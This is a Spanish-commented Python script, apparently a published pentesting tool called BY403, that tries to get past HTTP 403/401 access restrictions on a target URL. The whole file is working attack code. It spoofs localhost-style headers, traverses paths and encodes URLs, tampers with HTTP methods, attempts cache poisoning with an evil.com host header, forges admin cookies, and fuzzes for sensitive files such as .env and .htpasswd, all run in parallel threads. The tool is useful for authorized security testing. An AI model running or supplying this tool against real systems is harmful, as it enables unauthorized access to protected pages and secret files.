#!/usr/bin/env python3
"""
BY403 - Herramienta completa de bypass 403/401
Autor: hackingyseguridad.com (2026)
Versión: 2.0
"""

import requests
import argparse
from urllib.parse import urlparse, urljoin, quote, unquote
import random
import string
import json
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Configuración global
requests.packages.urllib3.disable_warnings()
TIMEOUT = 10

class Bypass403:
    def __init__(self, url, proxy=None, headers_file=None, verbose=False, output=None, max_workers=20):
        self.url = url
        self.parsed_url = urlparse(url)
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        self.path = self.parsed_url.path
        self.verbose = verbose
        self.output_file = output
        self.max_workers = max_workers
        self.results = []
        self.lock = threading.Lock()
        
        # Headers base
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Cargar headers personalizados
        if headers_file:
            self.load_custom_headers(headers_file)
        
        # Configurar proxy
        self.proxies = {}
        if proxy:
            self.proxies = {
                'http': proxy,
                'https': proxy
            }
    
    def load_custom_headers(self, headers_file):
        """Cargar headers desde archivo"""
        try:
            with open(headers_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        key, value = line.split(':', 1)
                        self.headers[key.strip()] = value.strip()
        except Exception as e:
            self.log(f"[!] Error cargando headers: {e}", "ERROR")
    
    def log(self, message, level="INFO"):
        """Log con niveles"""
        if level == "ERROR":
            print(f"\033[91m{message}\033[0m")
        elif level == "SUCCESS":
            print(f"\033[92m{message}\033[0m")
        elif level == "WARNING":
            print(f"\033[93m{message}\033[0m")
        else:
            print(message)
        
        # Guardar en archivo si se especificó
        if self.output_file:
            with open(self.output_file, 'a') as f:
                f.write(f"[{level}] {message}\n")
    
    def save_result(self, technique, url, status, length, title="", comment=""):
        """Guardar resultado"""
        with self.lock:
            result = {
                'technique': technique,
                'url': url,
                'status': status,
                'length': length,
                'title': title,
                'comment': comment,
                'time': time.strftime("%Y-%m-%d %H:%M:%S")
            }
            self.results.append(result)
    
    def test_request(self, method, url, headers=None, data=None, allow_redirects=False):
        """Realizar petición HTTP"""
        try:
            response = requests.request(
                method=method,
                url=url,
                headers=headers if headers else self.headers,
                data=data,
                proxies=self.proxies,
                verify=False,
                timeout=TIMEOUT,
                allow_redirects=allow_redirects
            )
            
            # Extraer título si es HTML
            title = ""
            if 'text/html' in response.headers.get('Content-Type', ''):
                import re
                title_match = re.search(r'<title>(.*?)</title>', response.text, re.IGNORECASE)
                if title_match:
                    title = title_match.group(1)[:50]
            
            return response, title
        except Exception as e:
            if self.verbose:
                self.log(f"Error en {url}: {e}", "ERROR")
            return None, ""
    
    # ========== CATEGORÍA 1: HEADERS ESPECIALES ==========
    def test_header_bypasses(self):
        """Probar bypass mediante headers HTTP"""
        techniques = []
        
        # 1. X-Original-URL
        headers = self.headers.copy()
        headers['X-Original-URL'] = self.path
        techniques.append(("X-Original-URL", '/anything', headers))
        
        # 2. X-Rewrite-URL
        headers = self.headers.copy()
        headers['X-Rewrite-URL'] = self.path
        techniques.append(("X-Rewrite-URL", '/anything', headers))
        
        # 3. X-Forwarded-For variaciones
        xff_headers = [
            '127.0.0.1',
            'localhost',
            '0.0.0.0',
            '::1',
            '2130706433',  # 127.0.0.1 en decimal
            '127.1',
            '127.0.0.1, 127.0.0.1',
            '127.0.0.1, localhost'
        ]
        
        for xff in xff_headers:
            headers = self.headers.copy()
            headers['X-Forwarded-For'] = xff
            techniques.append((f"X-Forwarded-For ({xff})", self.url, headers))
        
        # 4. Referer bypass
        headers = self.headers.copy()
        headers['Referer'] = self.base_url
        techniques.append(("Referer", self.url, headers))
        
        headers = self.headers.copy()
        headers['Referer'] = self.base_url + '/admin'
        techniques.append(("Referer (admin)", self.url, headers))
        
        # 5. Host header attacks
        headers = self.headers.copy()
        headers['Host'] = 'localhost'
        techniques.append(("Host: localhost", self.url, headers))
        
        # 6. X-Forwarded-Host
        headers = self.headers.copy()
        headers['X-Forwarded-Host'] = 'localhost'
        techniques.append(("X-Forwarded-Host: localhost", self.url, headers))
        
        # 7. X-Forwarded-Prefix
        headers = self.headers.copy()
        headers['X-Forwarded-Prefix'] = '/'
        techniques.append(("X-Forwarded-Prefix: /", self.url, headers))
        
        # 8. X-Custom-IP-Authorization
        headers = self.headers.copy()
        headers['X-Custom-IP-Authorization'] = '127.0.0.1'
        techniques.append(("X-Custom-IP-Authorization", self.url, headers))
        
        # 9. X-Originating-IP
        headers = self.headers.copy()
        headers['X-Originating-IP'] = '127.0.0.1'
        techniques.append(("X-Originating-IP", self.url, headers))
        
        # 10. X-Remote-IP
        headers = self.headers.copy()
        headers['X-Remote-IP'] = '127.0.0.1'
        techniques.append(("X-Remote-IP", self.url, headers))
        
        # 11. X-Client-IP
        headers = self.headers.copy()
        headers['X-Client-IP'] = '127.0.0.1'
        techniques.append(("X-Client-IP", self.url, headers))
        
        # 12. X-Host
        headers = self.headers.copy()
        headers['X-Host'] = 'localhost'
        techniques.append(("X-Host", self.url, headers))
        
        # 13. X-Forwarded-Server
        headers = self.headers.copy()
        headers['X-Forwarded-Server'] = 'localhost'
        techniques.append(("X-Forwarded-Server", self.url, headers))
        
        # 14. X-HTTP-Method-Override
        for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'TRACE']:
            headers = self.headers.copy()
            headers['X-HTTP-Method-Override'] = method
            techniques.append((f"X-HTTP-Method-Override: {method}", self.url, headers))
        
        # 15. Content-Length: 0 en GET
        headers = self.headers.copy()
        headers['Content-Length'] = '0'
        techniques.append(("Content-Length: 0", self.url, headers))
        
        # Probar todas las técnicas
        self.log("\n[+] Probando bypass con Headers HTTP...", "INFO")
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for tech_name, endpoint, headers in techniques:
                test_url = urljoin(self.base_url, endpoint) if endpoint.startswith('/') else endpoint
                futures.append(
                    executor.submit(self.test_and_report, tech_name, "GET", test_url, headers)
                )
            
            for future in as_completed(futures):
                future.result()
    
    # ========== CATEGORÍA 2: MANIPULACIÓN DE URL ==========
    def test_url_manipulation(self):
        """Probar manipulación de URLs"""
        techniques = []
        
        # 1. URL encoding
        encoded_path = quote(self.path, safe='')
        techniques.append(("URL Encoding", self.base_url + encoded_path))
        
        # 2. Double encoding
        double_encoded = quote(quote(self.path, safe=''), safe='')
        techniques.append(("Double Encoding", self.base_url + double_encoded))
        
        # 3. Unicode encoding
        unicode_path = self.path.replace('/', '%c0%af')
        techniques.append(("Unicode Encoding", self.base_url + unicode_path))
        
        # 4. Case variation
        mixed_case = ''.join(
            c.upper() if random.random() > 0.5 else c.lower() 
            for c in self.path
        )
        techniques.append(("Case Variation", self.base_url + mixed_case))
        
        # 5. Adding dots
        dot_variations = [
            f"{self.path}/.",
            f"{self.path}..",
            f"{self.path}...",
            f".{self.path}",
            f"{self.path}....",
            f"{self.path}...../",
        ]
        
        for i, var in enumerate(dot_variations):
            techniques.append((f"Dots Variation {i+1}", self.base_url + var))
        
        # 6. Adding slashes
        slash_variations = [
            f"//{self.path.lstrip('/')}",
            f"{self.path}//",
            f"///{self.path.lstrip('/')}///",
            f"{self.path}///",
            f"////{self.path.lstrip('/')}",
        ]
        
        for i, var in enumerate(slash_variations):
            techniques.append((f"Slash Variation {i+1}", self.base_url + var))
        
        # 7. Adding semicolons
        semicolon_variations = [
            f"{self.path};",
            f"{self.path};;",
            f"{self.path};/",
            f"{self.path}/;",
            f";{self.path.lstrip('/')}",
        ]
        
        for i, var in enumerate(semicolon_variations):
            techniques.append((f"Semicolon Variation {i+1}", self.base_url + var))
        
        # 8. Adding spaces
        space_variations = [
            f"{self.path}%20",
            f"{self.path}%09",
            f"{self.path}%00",
            f"{self.path}%0d",
            f"{self.path}%0a",
            f"{self.path} ",
        ]
        
        for i, var in enumerate(space_variations):
            techniques.append((f"Space Variation {i+1}", self.base_url + var))
        
        # 9. Path traversal attempts
        traversal_variations = [
            f"{self.path}../",
            f"{self.path}..;/",
            f"{self.path}..%2f",
            f"{self.path}..%252f",
            f"{self.path}%2e%2e%2f",
            f"{self.path}..././",
        ]
        
        for i, var in enumerate(traversal_variations):
            techniques.append((f"Traversal Variation {i+1}", self.base_url + var))
        
        # 10. Adding parameters
        param_variations = [
            f"{self.path}?",
            f"{self.path}??",
            f"{self.path}?test=1",
            f"{self.path}?&",
            f"{self.path}?#",
            f"{self.path}?%0d%0a",
        ]
        
        for i, var in enumerate(param_variations):
            techniques.append((f"Parameter Variation {i+1}", self.base_url + var))
        
        # 11. Null byte injection
        null_variations = [
            f"{self.path}%00",
            f"{self.path}.css%00",
            f"{self.path}.js%00",
            f"{self.path}.html%00",
            f"{self.path}%00.html",
        ]
        
        for i, var in enumerate(null_variations):
            techniques.append((f"Null Byte Variation {i+1}", self.base_url + var))
        
        # 12. Backslashes
        backslash_variations = [
            f"{self.path.replace('/', '\\\\')}",
            f"{self.path}\\\\",
            f"{self.path}/\\",
        ]
        
        for i, var in enumerate(backslash_variations):
            techniques.append((f"Backslash Variation {i+1}", self.base_url + var))
        
        # 13. Mixed encoding
        mixed = self.path.replace('/', '%2f').replace('.', '%2e')
        techniques.append(("Mixed Encoding", self.base_url + mixed))
        
        # 14. URL fragments
        fragment_variations = [
            f"{self.path}#",
            f"{self.path}#test",
            f"{self.path}%23",
            f"{self.path}/#",
        ]
        
        for i, var in enumerate(fragment_variations):
            techniques.append((f"Fragment Variation {i+1}", self.base_url + var))
        
        # 15. HTTP parameter pollution
        hpp_variations = [
            f"{self.path}?test=1&test=2",
            f"{self.path}?test[]=1&test[]=2",
            f"{self.path}?test=1;test=2",
            f"{self.path}?test=1%26test=2",
        ]
        
        for i, var in enumerate(hpp_variations):
            techniques.append((f"HPP Variation {i+1}", self.base_url + var))
        
        self.log("\n[+] Probando manipulación de URLs...", "INFO")
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for tech_name, test_url in techniques:
                futures.append(
                    executor.submit(self.test_and_report, tech_name, "GET", test_url)
                )
            
            for future in as_completed(futures):
                future.result()
    
    # ========== CATEGORÍA 3: MÉTODOS HTTP ==========
    def test_http_methods(self):
        """Probar diferentes métodos HTTP"""
        methods = [
            'GET', 'POST', 'PUT', 'DELETE', 'PATCH', 
            'OPTIONS', 'HEAD', 'TRACE', 'CONNECT',
            'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY',
            'MOVE', 'LOCK', 'UNLOCK', 'REPORT', 'ACL', 'ARBITRARY'
        ]
        
        self.log("\n[+] Probando diferentes métodos HTTP...", "INFO")
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for method in methods:
                futures.append(
                    executor.submit(self.test_and_report, f"HTTP Method: {method}", method, self.url)
                )
            
            for future in as_completed(futures):
                future.result()
    
    # ========== CATEGORÍA 4: CACHE POISONING ==========
    def test_cache_poisoning(self):
        """Probar técnicas de cache poisoning"""
        self.log("\n[+] Probando técnicas de Cache Poisoning...", "INFO")
        
        # Headers comunes para cache poisoning
        cache_headers = [
            ('X-Forwarded-Host', 'evil.com'),
            ('X-Forwarded-Scheme', 'http'),
            ('X-Forwarded-Port', '80'),
            ('X-Original-URL', self.path),
            ('X-Rewrite-URL', self.path),
            ('X-Forwarded-Prefix', '/'),
        ]
        
        # Endpoints comunes para cache
        cache_endpoints = [
            '/', '/index', '/home', '/main', '/static',
            '/css', '/js', '/images', '/img', '/assets',
            '/public', '/cache', '/api', '/v1', '/v2',
            '/wp-content', '/wp-includes', '/wp-admin'
        ]
        
        techniques = []
        
        for endpoint in cache_endpoints[:5]:  # Limitar para no saturar
            for header_name, header_value in cache_headers:
                headers = self.headers.copy()
                headers[header_name] = header_value
                techniques.append(
                    (f"Cache Poisoning: {header_name} on {endpoint}", 
                     urljoin(self.base_url, endpoint), headers)
                )
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for tech_name, test_url, headers in techniques:
                futures.append(
                    executor.submit(self.test_and_report, tech_name, "GET", test_url, headers)
                )
            
            for future in as_completed(futures):
                future.result()
    
    # ========== CATEGORÍA 5: BYPASS CON PARÁMETROS ==========
    def test_parameter_bypass(self):
        """Probar bypass mediante parámetros"""
        if '?' not in self.url:
            return
        
        base_url, params = self.url.split('?', 1)
        param_dict = {}
        
        for param in params.split('&'):
            if '=' in param:
                key, value = param.split('=', 1)
                param_dict[key] = value
        
        self.log("\n[+] Probando bypass con parámetros...", "INFO")
        
        # Variaciones de parámetros
        param_variations = []
        
        for key, value in param_dict.items():
            # Cambiar orden
            new_params = params.replace(f"{key}={value}", f"{value}={key}")
            param_variations.append((f"Swap {key}={value}", f"{base_url}?{new_params}"))
            
            # Encoding
            encoded_key = quote(key)
            encoded_value = quote(value)
            param_variations.append((f"Encode param {key}", f"{base_url}?{encoded_key}={encoded_value}"))
            
            # Añadir parámetros duplicados
            param_variations.append((f"Duplicate {key}", f"{base_url}?{key}={value}&{key}={value}2"))
            
            # Null bytes
            param_variations.append((f"Null in {key}", f"{base_url}?{key}={value}%00"))
            
            # Array parameters
            param_variations.append((f"Array {key}", f"{base_url}?{key}[]={value}"))
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for tech_name, test_url in param_variations[:20]:  # Limitar
                futures.append(
                    executor.submit(self.test_and_report, tech_name, "GET", test_url)
                )
            
            for future in as_completed(futures):
                future.result()
    
    # ========== CATEGORÍA 6: FUZZING DE EXTENSIONES ==========
    def test_extension_fuzzing(self):
        """Probar diferentes extensiones de archivo"""
        if '.' in self.path:
            base_path = self.path.rsplit('.', 1)[0]
        else:
            base_path = self.path
        
        extensions = [
            '', '.html', '.htm', '.php', '.php2', '.php3', '.php4', '.php5',
            '.phtml', '.asp', '.aspx', '.jsp', '.jspx', '.do', '.action',
            '.cgi', '.pl', '.py', '.rb', '.xml', '.json', '.txt', '.md',
            '.bak', '.old', '.orig', '.temp', '.tmp', '.swp',
            '.css', '.js', '.jpg', '.png', '.gif', '.pdf', '.doc', '.xls',
            '.tar', '.zip', '.gz', '.bz2', '.7z', '.sql', '.db', '.dbf',
            '.mdb', '.log', '.env', '.config', '.ini', '.conf', '.yaml',
            '.yml', '.git', '.svn', '.htaccess', '.htpasswd'
        ]
        
        self.log("\n[+] Probando diferentes extensiones...", "INFO")
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for ext in extensions:
                test_url = self.base_url + base_path + ext
                futures.append(
                    executor.submit(self.test_and_report, f"Extension: {ext}", "GET", test_url)
                )
            
            for future in as_completed(futures):
                future.result()
    
    # ========== CATEGORÍA 7: PROTOCOLOS Y PORTS ==========
    def test_protocol_port_bypass(self):
        """Probar diferentes protocolos y puertos"""
        if ':' in self.parsed_url.netloc:
            host, port = self.parsed_url.netloc.split(':', 1)
        else:
            host = self.parsed_url.netloc
            port = '443' if self.parsed_url.scheme == 'https' else '80'
        
        protocols = ['http', 'https']
        ports = ['80', '443', '8080', '8443', '8000', '8888', '3000', '5000']
        
        self.log("\n[+] Probando diferentes protocolos y puertos...", "INFO")
        
        techniques = []
        
        for proto in protocols:
            for test_port in ports:
                if test_port != port:
                    test_url = f"{proto}://{host}:{test_port}{self.path}"
                    techniques.append((f"{proto} on port {test_port}", test_url))
        
        # También probar sin puerto
        for proto in protocols:
            test_url = f"{proto}://{host}{self.path}"
            techniques.append((f"{proto} without port", test_url))
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for tech_name, test_url in techniques[:10]:  # Limitar
                futures.append(
                    executor.submit(self.test_and_report, tech_name, "GET", test_url)
                )
            
            for future in as_completed(futures):
                future.result()
    
    # ========== CATEGORÍA 8: BYPASS CON COOKIES ==========
    def test_cookie_bypass(self):
        """Probar bypass mediante cookies"""
        cookie_variations = [
            'admin=true',
            'authenticated=1',
            'logged_in=true',
            'user=admin',
            'role=administrator',
            'access=full',
            'auth=1',
            'session=admin',
            'token=admin',
            'privilege=high',
            'admin=1',
            'is_admin=true',
            'authorized=yes',
            'status=authenticated',
            'login=success'
        ]
        
        self.log("\n[+] Probando bypass con Cookies...", "INFO")
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for cookie in cookie_variations:
                headers = self.headers.copy()
                headers['Cookie'] = cookie
                futures.append(
                    executor.submit(self.test_and_report, f"Cookie: {cookie}", "GET", self.url, headers)
                )
            
            for future in as_completed(futures):
                future.result()
    
    # ========== CATEGORÍA 9: FUZZING DE DIRECTORIOS ==========
    def test_directory_fuzzing(self):
        """Probar fuzzing de directorios comunes"""
        common_dirs = [
            '/admin', '/administrator', '/wp-admin', '/dashboard',
            '/control', '/manage', '/backend', '/system',
            '/private', '/secret', '/hidden', '/secure',
            '/api', '/v1', '/v2', '/internal',
            '/test', '/dev', '/staging', '/demo',
            '/config', '/backup', '/temp', '/tmp',
            '/cgi-bin', '/bin', '/scripts', '/tools',
            '/console', '/shell', '/cmd', '/command'
        ]
        
        self.log("\n[+] Probando directorios comunes...", "INFO")
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for directory in common_dirs[:15]:  # Limitar
                test_url = self.base_url + directory
                futures.append(
                    executor.submit(self.test_and_report, f"Directory: {directory}", "GET", test_url)
                )
            
            for future in as_completed(futures):
                future.result()
    
    # ========== FUNCIÓN PRINCIPAL DE TESTEO ==========
    def test_and_report(self, technique, method, url, custom_headers=None):
        """Ejecutar test y reportar resultados"""
        try:
            response, title = self.test_request(
                method, 
                url, 
                headers=custom_headers if custom_headers else self.headers
            )
            
            if response is not None:
                status = response.status_code
                length = len(response.content)
                
                # Guardar resultado
                self.save_result(
                    technique, 
                    url, 
                    status, 
                    length, 
                    title
                )
                
                # Mostrar si es interesante
                if status not in [403, 401, 404, 400, 500]:
                    comment = "¡POSIBLE BYPASS!"
                    self.log(f"[✓] {technique}", "SUCCESS")
                    self.log(f"    URL: {url}", "SUCCESS")
                    self.log(f"    Status: {status} | Length: {length}", "SUCCESS")
                    if title:
                        self.log(f"    Title: {title}", "SUCCESS")
                    self.log("    " + "-"*40, "SUCCESS")
                    
                    # Actualizar resultado
                    self.results[-1]['comment'] = comment
                    
                elif self.verbose and status != 403:
                    self.log(f"[i] {technique} - Status: {status}")
            
        except Exception as e:
            if self.verbose:
                self.log(f"[!] Error en {technique}: {e}", "ERROR")
    
    # ========== EJECUTAR TODAS LAS PRUEBAS ==========
    def run_all_tests(self):
        """Ejecutar todas las pruebas de bypass"""
        self.log(f"\n{'='*60}", "INFO")
        self.log("BY403 - Herramienta Completa de Bypass 403/401", "INFO")
        self.log(f"{'='*60}", "INFO")
        self.log(f"Target: {self.url}", "INFO")
        self.log(f"Base URL: {self.base_url}", "INFO")
        self.log(f"Path: {self.path}", "INFO")
        self.log(f"{'='*60}\n", "INFO")
        
        start_time = time.time()
        
        # Ejecutar todas las categorías
        test_functions = [
            self.test_header_bypasses,
            self.test_url_manipulation,
            self.test_http_methods,
            self.test_cache_poisoning,
            self.test_parameter_bypass,
            self.test_extension_fuzzing,
            self.test_protocol_port_bypass,
            self.test_cookie_bypass,
            self.test_directory_fuzzing
        ]
        
        for test_func in test_functions:
            try:
                test_func()
                time.sleep(0.5)  # Pequeña pausa entre categorías
            except Exception as e:
                self.log(f"Error en {test_func.__name__}: {e}", "ERROR")
        
        # Mostrar resumen
        self.show_summary(start_time)
        
        # Exportar resultados
        if self.results:
            self.export_results()
    
    def show_summary(self, start_time):
        """Mostrar resumen de resultados"""
        elapsed = time.time() - start_time
        
        self.log(f"\n{'='*60}", "INFO")
        self.log("RESUMEN DE RESULTADOS", "INFO")
        self.log(f"{'='*60}", "INFO")
        
        # Contar por status code
        status_counts = {}
        bypasses = []
        
        for result in self.results:
            status = result['status']
            status_counts[status] = status_counts.get(status, 0) + 1
            
            if status not in [403, 401, 404, 400, 500] and status < 500:
                bypasses.append(result)
        
        self.log(f"\nTotal de pruebas realizadas: {len(self.results)}", "INFO")
        self.log(f"Tiempo total: {elapsed:.2f} segundos", "INFO")
        
        self.log(f"\nDistribución de códigos de estado:", "INFO")
        for status, count in sorted(status_counts.items()):
            self.log(f"  {status}: {count}", "INFO")
        
        if bypasses:
            self.log(f"\n[!] POSIBLES BYPASS ENCONTRADOS: {len(bypasses)}", "WARNING")
            for bypass in bypasses:
                self.log(f"\n  Técnica: {bypass['technique']}", "SUCCESS")
                self.log(f"  URL: {bypass['url']}", "SUCCESS")
                self.log(f"  Status: {bypass['status']} | Length: {bypass['length']}", "SUCCESS")
                if bypass.get('title'):
                    self.log(f"  Title: {bypass['title']}", "SUCCESS")
        else:
            self.log(f"\n[!] No se encontraron bypass obvios", "WARNING")
    
    def export_results(self):
        """Exportar resultados a archivos"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        
        # Exportar a JSON
        json_file = f"bypass_results_{timestamp}.json"
        with open(json_file, 'w') as f:
            json.dump(self.results, f, indent=2)
        self.log(f"\n[+] Resultados exportados a: {json_file}", "INFO")
        
        # Exportar a CSV
        csv_file = f"bypass_results_{timestamp}.csv"
        import csv
        with open(csv_file, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Technique', 'URL', 'Status', 'Length', 'Title', 'Time'])
            for result in self.results:
                writer.writerow([
                    result['technique'],
                    result['url'],
                    result['status'],
                    result['length'],
                    result.get('title', ''),
                    result['time']
                ])
        self.log(f"[+] Resultados CSV exportados a: {csv_file}", "INFO")
        
        # Exportar solo bypass encontrados
        bypasses = [r for r in self.results if r['status'] not in [403, 401, 404, 400, 500]]
        if bypasses:
            bypass_file = f"bypass_found_{timestamp}.txt"
            with open(bypass_file, 'w') as f:
                f.write(f"Bypass encontrados para: {self.url}\n")
                f.write(f"Fecha: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("="*60 + "\n\n")
                
                for bypass in bypasses:
                    f.write(f"Técnica: {bypass['technique']}\n")
                    f.write(f"URL: {bypass['url']}\n")
                    f.write(f"Status: {bypass['status']} | Length: {bypass['length']}\n")
                    if bypass.get('title'):
                        f.write(f"Title: {bypass['title']}\n")
                    f.write("-"*40 + "\n")
            
            self.log(f"[+] Bypass encontrados exportados a: {bypass_file}", "SUCCESS")

# ========== MAIN ==========
def main():
    banner = r"""


               )\._.,--....,'``.      
 .b--.        /;   _.. \   _\  (`._ ,.
`=,-,-'~~~   `----(,_..'--(,_..'`-.;.'   Bypass 40x 

$$$$$$$$$$$$$$$ $$$$$$$$$$$$$$$$$$$$$ $$$$$$$$$$$$$$$$$$$$$$
    
    Bypass 403/401
    Versión 2.0 | hackingyseguridad.com ( 2026 ) 
    """
    
    print(banner)
    
    parser = argparse.ArgumentParser(
        description='Herramienta completa para bypass de 403/401',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Ejemplos de uso:
  %(prog)s http://target.com/admin
  %(prog)s https://example.com/private --proxy http://127.0.0.1:8080
  %(prog)s http://test.com/secret --verbose --output results.txt
  %(prog)s http://site.com/api --headers custom_headers.txt
        
Nota: Solo para uso en entornos autorizados.
        '''
    )
    
    parser.add_argument('url', help='URL objetivo (ej: http://target.com/admin)')
    parser.add_argument('--proxy', help='Proxy a usar (ej: http://127.0.0.1:8080)')
    parser.add_argument('--headers', help='Archivo con headers personalizados')
    parser.add_argument('--verbose', '-v', action='store_true', help='Mostrar más información')
    parser.add_argument('--output', '-o', help='Archivo para guardar resultados')
    parser.add_argument('--threads', '-t', type=int, default=20, 
                       help='Número de threads (default: 20)')
    
    args = parser.parse_args()
    
    # Crear y ejecutar herramienta
    bypass_tool = Bypass403(
        url=args.url,
        proxy=args.proxy,
        headers_file=args.headers,
        verbose=args.verbose,
        output=args.output,
        max_workers=args.threads
    )
    
    try:
        bypass_tool.run_all_tests()
    except KeyboardInterrupt:
        print("\n[!] Interrumpido por el usuario")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error fatal: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
